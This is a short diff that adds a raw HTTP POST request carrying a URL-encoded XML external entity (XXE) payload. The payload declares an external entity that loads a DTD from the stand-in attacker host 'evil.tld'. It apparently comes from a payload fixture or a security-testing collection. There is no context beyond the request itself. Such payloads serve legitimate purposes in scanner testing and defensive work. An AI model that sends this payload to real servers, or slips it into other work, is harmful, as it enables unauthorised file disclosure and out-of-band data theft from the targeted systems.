@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+Connection: close
+
+s=<?xml%0aversion="1.0"?><!DOCTYPE%0ar%0a[<!ENTITY%0ax%0aSYSTEM%0a"http://evil.tld/x.dtd">]><r>&x;</r>
